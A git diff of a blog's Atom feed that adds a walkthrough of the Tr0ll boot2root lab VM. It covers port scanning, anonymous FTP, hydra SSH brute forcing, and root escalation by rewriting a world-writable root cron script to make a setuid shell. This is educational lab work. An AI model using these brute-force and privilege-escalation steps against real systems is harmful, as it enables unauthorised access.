@@ -4,7 +4,7 @@
   <title><![CDATA[#!/slash/note]]></title>
   <link href="http://leonjza.github.io/atom.xml" rel="self"/>
   <link href="http://leonjza.github.io/"/>
-  <updated>2014-08-14T08:13:40+02:00</updated>
+  <updated>2014-08-15T09:09:15+02:00</updated>
   <id>http://leonjza.github.io/</id>
   <author>
     <name><![CDATA[Leon Jacobs]]></name>
@@ -14,7 +14,465 @@
 
   
   <entry>
-    <title type="html"><![CDATA[Beating Xerxes 2 (No, Not the Persian King)]]></title>
+    <title type="html"><![CDATA[taming (actually just solving) the troll]]></title>
+    <link href="http://leonjza.github.io/blog/2014/08/15/taming-the-troll/"/>
+    <updated>2014-08-15T07:12:03+02:00</updated>
+    <id>http://leonjza.github.io/blog/2014/08/15/taming-the-troll</id>
+    <content type="html"><![CDATA[<h2>foreword</h2>
+
+<p>Having recently started the road to <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">OSCP</a>, <a href="https://twitter.com/Maleus21">@Maleus21</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> on <a href="https://twitter.com/VulnHub">@VulnHub</a>. I figured since the description was <em>Difficulty: Beginner ; Type: boot2root</em>, I could give it a smash in a evening as a bit of distraction.</p>
+
+<h2>nomad, promise</h2>
+
+<p>As usual, I downloaded the VM, extracted the <code>.rar</code> and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:</p>
+
+<figure class='code'><figcaption><span>Tr0ll nmap</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -v --reason -sV 192.168.56.101 -p-
+</span><span class='line'>
+</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
+</span><span class='line'>21/tcp open  ftp     syn-ack vsftpd 3.0.2
+</span><span class='line'>22/tcp open  ssh     syn-ack <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span><span class='line'>80/tcp open  http    syn-ack Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So, <code>ssh</code>, <code>ftp</code>, and <code>http</code>. Naturally my first reaction was to inspect the web service.</p>
+
+<p><img src="https://i.imgur.com/SiNzlyi.png"></p>
+
+<p>The <code>robots.txt</code> file revealed:</p>
+
+<figure class='code'><figcaption><span>Tr0ll robots.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>User-agent:*
+</span><span class='line'>Disallow: /secret
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Browsing to <code>/secret</code> revealed yet another <em>interesting</em> piece of art:</p>
+
+<p><img src="https://i.imgur.com/E2SezsL.png"></p>
+
+<p>Right&hellip; A little early to be &lsquo;mad&rsquo;, but nonetheless, lets move on.</p>
+
+<h2>anonny-mouse ftp</h2>
+
+<p>A quick and lazy google for <code>vsftpd 3.0.2 exploit</code> didn&rsquo;t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:</p>
+
+<figure class='code'><figcaption><span>Tr0ll ftp login</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ftp 192.168.56.101
+</span><span class='line'>Connected to 192.168.56.101.
+</span><span class='line'>220 <span class="o">(</span>vsFTPd 3.0.2<span class="o">)</span>
+</span><span class='line'>Name <span class="o">(</span>192.168.56.101:root<span class="o">)</span>: anonymous
+</span><span class='line'>331 Please specify the password.
+</span><span class='line'>Password:
+</span><span class='line'>230 Login successful.
+</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
+</span><span class='line'>Using binary mode to transfer files.
+</span><span class='line'>
+</span><span class='line'>ftp&gt; ls
+</span><span class='line'>500 Illegal PORT command.
+</span><span class='line'>ftp: <span class="nb">bind</span>: Address already in use
+</span><span class='line'>
+</span><span class='line'>ftp&gt; passive
+</span><span class='line'>Passive mode on.
+</span><span class='line'>
+</span><span class='line'>ftp&gt; ls
+</span><span class='line'>227 Entering Passive Mode <span class="o">(</span>192,168,56,101,231,190<span class="o">)</span>
+</span><span class='line'>150 Here comes the directory listing.
+</span><span class='line'>-rwxrwxrwx    1 1000     0            8068 Aug 10 00:43 lol.pcap
+</span><span class='line'>226 Directory send OK.
+</span><span class='line'>
+</span><span class='line'>ftp&gt; get lol.pcap
+</span><span class='line'><span class="nb">local</span>: lol.pcap remote: lol.pcap
+</span><span class='line'>227 Entering Passive Mode <span class="o">(</span>192,168,56,101,189,113<span class="o">)</span>
+</span><span class='line'>150 Opening BINARY mode data connection <span class="k">for </span>lol.pcap <span class="o">(</span>8068 bytes<span class="o">)</span>.
+</span><span class='line'>226 Transfer complete.
+</span><span class='line'>8068 bytes received in 0.00 secs <span class="o">(</span>21294.3 kB/s<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>ftp&gt; bye
+</span><span class='line'>221 Goodbye.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well that worked, and showed that we have a file <code>lol.pcap</code> to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called <code>secret_stuff.txt</code> that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:</p>
+
+<p><img src="https://i.imgur.com/vpgEP3o.png"></p>
+
+<p>Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to <a href="http://192.168.56.101/sup3rs3cr3tdirlol/.">http://192.168.56.101/sup3rs3cr3tdirlol/.</a> In this path there was a binary  called <code>roflmao</code>. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:</p>
+
+<figure class='code'><figcaption><span>Tr0ll roflmao file</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
+</span><span class='line'>--2014-08-15 07:57:56--  http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
+</span><span class='line'>Connecting to 192.168.56.101:80... connected.
+</span><span class='line'>HTTP request sent, awaiting response... 200 OK
+</span><span class='line'>Length: 7296 <span class="o">(</span>7.1K<span class="o">)</span>
+</span><span class='line'>Saving to: <span class="sb">`</span>roflmao<span class="s1">&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">100%[======&gt;] 7,296       --.-K/s   in 0s      </span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">2014-08-15 07:57:56 (826 MB/s) - `roflmao&#39;</span> saved <span class="o">[</span>7296/7296<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>root@kali:~/Desktop/Tr0ll# chmod +x roflmao
+</span><span class='line'>root@kali:~/Desktop/Tr0ll# ./roflmao
+</span><span class='line'>Find address 0x0856BF to proceed
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nice. <code>0x0856BF</code> is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with <a href="https://twitter.com/barrebas">@barrebas</a> on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried <a href="http://192.168.56.101/0x0856BF/:">http://192.168.56.101/0x0856BF/:</a></p>
+
+<p><img src="https://i.imgur.com/yXWgKij.png"></p>
+
+<h2>nohydraplz</h2>
+
+<p>Cool! At this stage I was pretty sure there was not much left to gain shell. The folder <code>good_luck</code> had a file called <code>which_one_lol.txt</code> with contents:</p>
+
+<figure class='code'><figcaption><span>which_one_lol.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>maleus
+</span><span class='line'>ps-aux
+</span><span class='line'>felux
+</span><span class='line'>Eagle11
+</span><span class='line'>genphlux &lt; -- Definitely not this one
+</span><span class='line'>usmc8892
+</span><span class='line'>blawrg
+</span><span class='line'>wytshadow
+</span><span class='line'>vis1t0r
+</span><span class='line'>overflow
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>List of passwords? Dunno. The folder <code>this_folder_contains_the_password</code> had a file <code>Pass.txt</code> with contents:</p>
+
+<figure class='code'><figcaption><span>Pass.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>Good_job_:)
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>At this stage I figured this had to be either a nicely provided wordlist for some <code>hydra</code> action on the <code>ftp</code> || <code>ssh</code> service. So naturally, I copied the information to a file called <code>list.txt</code> (also made a copy of the <code>genphlux</code> word so that its on its own line), and fired up hydra on <code>ssh</code>:</p>
+
+<figure class='code'><figcaption><span>Tr0ll hydra</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# hydra -v -V -u -L list -P list -t 1 -u 192.168.56.101 ssh
+</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span>2013 by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for </span>legal purposes only
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ssh on port 22
+</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Resolving addresses ... <span class="k">done</span>
+</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;maleus&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 1 of 169 <span class="o">[</span>child 0<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;ps-aux&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 2 of 169 <span class="o">[</span>child 0<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;felux&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 3 of 169 <span class="o">[</span>child 0<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;Eagle11&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 4 of 169 <span class="o">[</span>child 0<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;genphlux &lt; -- Definitely not this one&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 5 of 169 <span class="o">[</span>child 0<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;genphlux&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 6 of 169 <span class="o">[</span>child 0<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;usmc8892&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 7 of 169 <span class="o">[</span>child 0<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>ERROR<span class="o">]</span> could not connect to target port 22
+</span><span class='line'><span class="o">[</span>ERROR<span class="o">]</span> ssh protocol error
+</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Retrying connection <span class="k">for </span>child 0
+</span><span class='line'><span class="o">[</span>RE-ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;usmc8892&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 7 of 169 <span class="o">[</span>child 0<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>ERROR<span class="o">]</span> could not connect to target port 22
+</span><span class='line'><span class="o">[</span>ERROR<span class="o">]</span> ssh protocol error
+</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Retrying connection <span class="k">for </span>child 0
+</span><span class='line'><span class="o">[</span>RE-ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;usmc8892&quot;</span> - pass <span class="s2">&quot;maleus&quot;</span> - 7 of 169 <span class="o">[</span>child 0<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Err, the sudden errors only meant one thing&hellip; <code>fail2ban</code>.</p>
+
+<figure class='code'><figcaption><span>Tr0ll ssh filtered</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -v --reason -Pn 192.168.56.101 -p 22
+</span><span class='line'>
+</span><span class='line'>PORT   STATE    SERVICE REASON
+</span><span class='line'>22/tcp filtered ssh     no-response
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So, this was the first part that frustrated me and had me going <em>&ldquo;seriously&hellip; :\&rdquo;</em>. Maybe this was actually a list of <code>ftp</code> creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.</p>
+
+<h2>first shell</h2>
+
+<p>I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it&rsquo;s <code>thing</code>. Eventually, it was apparent that none of these words as a username/password combination was the correct one.</p>
+
+<p>Returning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to <em>read</em> everything), that the password may be in this folder (<code>this_folder_contains_the_password</code>). Get it, the <code>Pass.txt</code> is the password&hellip;</p>
+
+<p>Right, so I changed <code>hydra</code> slightly to use <code>Pass.txt</code> as a password and continued to brute with the original <code>list.txt</code> as usernames:</p>
+
+<figure class='code'><figcaption><span>Tr0ll hydra success`</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# hydra -v -V -u -L list -p <span class="s2">&quot;Pass.txt&quot;</span> -t 1 -u 192.168.56.101 ssh
+</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span>2013 by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for </span>legal purposes only
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> 1 task, 1 server, 13 login tries <span class="o">(</span>l:13/p:1<span class="o">)</span>, ~13 tries per task
+</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ssh on port 22
+</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Resolving addresses ... <span class="k">done</span>
+</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;maleus&quot;</span> - pass <span class="s2">&quot;Pass.txt&quot;</span> - 1 of 13 <span class="o">[</span>child 0<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;ps-aux&quot;</span> - pass <span class="s2">&quot;Pass.txt&quot;</span> - 2 of 13 <span class="o">[</span>child 0<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;felux&quot;</span> - pass <span class="s2">&quot;Pass.txt&quot;</span> - 3 of 13 <span class="o">[</span>child 0<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 192.168.56.101   login: overflow   password: Pass.txt
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Yay <code>overflow:Pass.txt</code> should get us a session via ssh:</p>
+
+<figure class='code'><figcaption><span>Tr0ll ssh</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/Tr0ll# ssh overflow@192.168.56.101
+</span><span class='line'>overflow@192.168.56.101<span class="err">&#39;</span>s password:
+</span><span class='line'>Welcome to Ubuntu 14.04.1 LTS <span class="o">(</span>GNU/Linux 3.13.0-32-generic i686<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>Could not chdir to home directory /home/overflow: No such file or directory
+</span><span class='line'><span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>overflow<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>overflow<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>overflow<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>&hellip; and root</h2>
+
+<p>And so it was time for classic enumeration again. The first <em>strange</em> thing was the fact that it appeared as if all the <code>/home</code> directories apart from <code>/home/troll</code> was deleted. Weird. Other than that, there were a whole bunch of users according to <code>/etc/passwd</code>, and I can&rsquo;t run anything as <code>root</code> via <code>sudo</code>.</p>
+
+<p>There was a file in <code>/opt/</code> called <code>lmao.py</code>, however I did not have access to read it. Soooo, more enumeration.</p>
+
+<p><em>suddenly</em></p>
+
+<figure class='code'><figcaption><span>Tr0ll times up</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Broadcast Message from root@trol
+</span><span class='line'>        <span class="o">(</span>somewhere<span class="o">)</span> at 16:05 ...
+</span><span class='line'>
+</span><span class='line'>TIMES UP LOL!
+</span><span class='line'>
+</span><span class='line'>Connection to 192.168.56.101 closed by remote host.
+</span><span class='line'>Connection to 192.168.56.101 closed.
+</span><span class='line'>root@kali:~#
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Urgh. Turns out, something is killing my ssh session every 5 minutes. <strong>Oh my word</strong>, was that annoying. I could handle everything the VM&rsquo;s offered, but this was probably the worst part of it.</p>
+
+<p>Eventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the <em>thing</em> I should be finding has a more recent timestamp:</p>
+
+<figure class='code'><figcaption><span>Tr0ll check </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>overflow@troll:/<span class="nv">$ </span>find / -executable -type f 2&gt; /dev/null <span class="p">|</span> egrep -v <span class="s2">&quot;^/bin|^/var|^/etc|^/usr&quot;</span> <span class="p">|</span> xargs ls -lh <span class="p">|</span> grep Aug
+</span><span class='line'>
+</span><span class='line'>-rwxrwxrwx 1 root  root    145 Aug 14 13:11 /lib/log/cleaner.py
+</span><span class='line'>-rwx--x--x 1 root  root    117 Aug 10 02:11 /opt/lmao.py
+</span><span class='line'>-rwxr-xr-x 1 root  root   2.4K Aug 27  2013 /sbin/installkernel
+</span><span class='line'>-rwxrwxrwx 1 troll root   7.9K Aug 10 00:43 /srv/ftp/lol.pcap
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A few interesting results came from that, however, the one that held the golden nugget was <code>/lib/log/cleaner.py</code>. During my enumeration I noticed that <code>/tmp</code> got cleaned out at a really strange time as I was still trying to <code>less</code> a file in there, however, it just <em>disappeared</em>.</p>
+
+<p>Anyways, as <code>cleaner.py</code> was owned by root and running <code>os.system</code>, I just modified it to prepare me a classic <code>getroot</code> binary:</p>
+
+<figure class='code'><figcaption><span>cleaner.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
+</span><span class='line'><span class="k">try</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot &#39;</span><span class="p">)</span>
+</span><span class='line'><span class="k">except</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I waited for that annoying &lsquo;Times UP&rsquo; message, and inspected <code>/var/tmp</code>:</p>
+
+<figure class='code'><figcaption><span>rooted</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>overflow@troll:/<span class="nv">$ </span>ls -lah /var/tmp/
+</span><span class='line'>total 24K
+</span><span class='line'>drwxrwxrwt  2 root     root     4.0K Aug 14 13:11 .
+</span><span class='line'>drwxr-xr-x 12 root     root     4.0K Aug 10 03:56 ..
+</span><span class='line'>-rwxrwxrwx  1 root     root       34 Aug 13 01:16 cleaner.py.swp
+</span><span class='line'>-rwsr-xr-x  1 root     root     7.2K Aug 14 13:09 getroot
+</span><span class='line'>-rw-rw-r--  1 overflow overflow   71 Aug 14 13:09 sh.c
+</span><span class='line'>
+</span><span class='line'>overflow@troll:/<span class="nv">$ </span>/var/tmp/getroot
+</span><span class='line'><span class="c">#</span>
+</span><span class='line'><span class="c"># id</span>
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>overflow<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>overflow<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># ls /root</span>
+</span><span class='line'>proof.txt
+</span><span class='line'>
+</span><span class='line'><span class="c"># cat /root/proof.txt</span>
+</span><span class='line'>Good job, you did it!
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>702a8c18d29c6f3ca0d99ef5712bfbdc
+</span><span class='line'><span class="c">#</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>for the curious</h2>
+
+<p>That really annoying session that keeps dying? Turns out its <code>/opt/lmao.py</code> to blame:</p>
+
+<figure class='code'><figcaption><span>grr</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># cat /opt/lmao.py</span>
+</span><span class='line'><span class="c">#!/usr/bin/env python</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;echo &quot;TIMES UP LOL!&quot;|wall&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;pkill -u &#39;overflow&#39;&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thanks <a href="https://twitter.com/maleus21">@maleus21</a> for the VM!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Beating Xerxes 2 (no, not the Persian King)]]></title>
     <link href="http://leonjza.github.io/blog/2014/08/09/beating-xerxes2/"/>
     <updated>2014-08-09T16:59:53+02:00</updated>
     <id>http://leonjza.github.io/blog/2014/08/09/beating-xerxes2</id>
@@ -1316,7 +1774,7 @@
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Flick - Can You Find the Flag?]]></title>
+    <title type="html"><![CDATA[flick - can you find the flag?]]></title>
     <link href="http://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/"/>
     <updated>2014-08-07T12:17:53+02:00</updated>
     <id>http://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag</id>
@@ -1347,7 +1805,7 @@
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Hell Would Just Not Freeze Over!]]></title>
+    <title type="html"><![CDATA[Hell would just not freeze over!]]></title>
     <link href="http://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/"/>
     <updated>2014-07-20T19:00:46+02:00</updated>
     <id>http://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over</id>
@@ -3852,7 +4310,7 @@ Oh yes, I obviously tried to just cat <code>/root/flag.txt</code>, but didn’t 
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Dnsfilexfer - Yet Another Take on File Transfer via DNS]]></title>
+    <title type="html"><![CDATA[dnsfilexfer - yet another take on file transfer via DNS]]></title>
     <link href="http://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/"/>
